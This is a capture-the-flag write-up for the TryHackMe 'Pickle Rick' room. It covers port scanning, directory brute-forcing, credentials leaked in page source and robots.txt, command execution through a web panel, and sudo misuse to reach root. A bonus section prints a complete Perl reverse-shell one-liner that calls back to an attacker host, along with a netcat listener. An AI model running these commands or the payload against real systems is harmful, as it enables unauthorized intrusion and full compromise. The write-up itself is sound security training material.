# TryHackMe — Pickle Rick
 
**Platform:** TryHackMe  
**Room:** [Pickle Rick](https://tryhackme.com/room/picklerick)  
**Category:** Web Exploitation / Linux Privilege Escalation  
**Difficulty:** Easy  
 
---
 
## Overview
 
A Rick and Morty themed CTF where the goal is to find 3 secret ingredients hidden across the target system. Covers web enumeration, directory brute-forcing, credential discovery, command execution, and reverse shell exploitation.
 
**Tools Used:**
- Nmap — port scanning and service enumeration
- Gobuster — directory brute-forcing
- Netcat — reverse shell listener
- Browser DevTools — page source inspection
- Perl — reverse shell payload
**Flags to find:** 3 ingredients hidden across the system
 
---
 
## Methodology
 
### Step 1 — Port Scanning
 
Full port scan with service and OS detection:
 
```bash
nmap -T4 -sC -sV -A -p- <target-ip>
```
 
**Flags explained:**
- `-T4` — scan speed (4/5)
- `-sC` — default NSE scripts for discovery
- `-sV` — service version detection
- `-A` — aggressive scan (OS detection, traceroute)
- `-p-` — scan all 65535 ports
**Result:** 2 open ports found:
- Port `80` — HTTP (Apache web server)
- Port `22` — SSH (OpenSSH)
---
 
### Step 2 — Web Enumeration (Port 80)
 
Navigated to `http://<target-ip>:80` in browser — found a basic Rick and Morty themed page.
 
**Page source inspection** revealed a hidden comment:
```
Note to self, remember username! Username: R1ckRul3s
```
 
Username discovered via developer tools — no authentication required to view.
 
---
 
### Step 3 — Directory Brute-Force (Gobuster)
 
```bash
gobuster dir -u http://<target-ip> \
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
-x php,sh,txt,cgi,html,css,js,py
```
 
**Key directories found:**
- `/login.php` — login page
- `/robots.txt` — contained the password
- `/portal.php` — command panel (post-login)
---
 
### Step 4 — Credential Discovery
 
`robots.txt` contained a plaintext string used as the password.
 
**Credentials obtained:**
- Username: `R1ckRul3s` (from page source)
- Password: found in `robots.txt`
Successfully logged into `/login.php`.
 
---
 
## Exploitation
 
### Flag 1 — Command Panel RCE
 
Post-login, a web-based command panel was available at `/portal.php` — direct command execution on the server.
 
```bash
ls        # list current directory files
```
 
First ingredient file visible in the web root. Accessed directly via browser.
 
> **Finding:** Web application exposed a command execution panel with no input sanitization — critical Remote Code Execution (RCE) vulnerability.
 
---
 
### Flag 2 — File System Enumeration
 
`cat` command was blocked by the application. Used `less` as an alternative:
 
```bash
ls /home/rick
less '/home/rick/second ingredients'
```
 
Second ingredient found in Rick's home directory.
 
> **Finding:** Sensitive files stored in user home directories accessible via RCE. Command blacklisting (blocking `cat`) is bypassable — not a valid security control.
 
---
 
### Flag 3 — Privilege Escalation via Sudo
 
Checked sudo permissions via the command panel:
 
```bash
sudo ls /root
sudo less /root/3rd.txt
```
 
Third ingredient found in `/root` directory — accessible because the web server user had unrestricted sudo access.
 
> **Finding:** Web server running with sudo privileges — critical misconfiguration. Any RCE on the web app leads to full root access.
 
---
 
### Bonus — Reverse Shell via Perl
 
SSH was open on port 22. Established a proper interactive reverse shell to demonstrate full exploitation:
 
**On attacker machine — start listener:**
```bash
nc -lvnp 1234
```
 
**On target via command panel — Perl reverse shell:**
```bash
perl -e 'use Socket;$i="<attacker-ip>";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
 
Full interactive shell obtained — `cat` and all other commands now available.
 
---
 
## Vulnerabilities Identified
 
| Finding | Severity | Description |
|---------|----------|-------------|
| Credentials in page source | High | Username exposed in HTML comment |
| Credentials in robots.txt | High | Password stored in plaintext publicly accessible file |
| Unauthenticated RCE via command panel | Critical | Web app executes OS commands with no sanitization |
| Sudo misconfiguration | Critical | Web server user has unrestricted sudo access |
| Command blacklisting bypassable | Medium | Blocking `cat` but not `less` — ineffective security control |
 
---
 
## MITRE ATT&CK Mapping
 
| ID | Technique | What happened |
|----|-----------|---------------|
| T1046 | Network Service Scanning | Nmap identified open ports 80 and 22 |
| T1083 | File and Directory Discovery | Gobuster found login.php, robots.txt, portal.php |
| T1552 | Unsecured Credentials | Username in page source, password in robots.txt |
| T1059 | Command & Scripting Interpreter | RCE via web command panel |
| T1548 | Abuse Elevation Control Mechanism | Sudo misconfiguration allowed root access |
| T1059.004 | Unix Shell — Reverse Shell | Perl reverse shell for interactive access |
 
---
 
## Key Takeaways
 
- Always check page source — developers sometimes leave credentials in HTML comments
- `robots.txt` is publicly accessible — never store sensitive information there
- Directory brute-forcing with Gobuster reveals hidden endpoints not linked on the main page
- Command blacklisting (blocking `cat`) is not a valid security control — always use whitelisting
- Web applications should never run with sudo or root privileges
- A single RCE vulnerability combined with sudo misconfiguration = full system compromise
---
 
## What I Learned
 
- Full web enumeration methodology: Nmap → browser recon → Gobuster → credential discovery
- How to use Gobuster for directory brute-forcing with multiple file extensions
- Establishing a Perl reverse shell and catching it with Netcat
- How sudo misconfiguration leads to privilege escalation from web app RCE
- Why defence-in-depth matters — multiple small misconfigurations chained together led to full root access
 
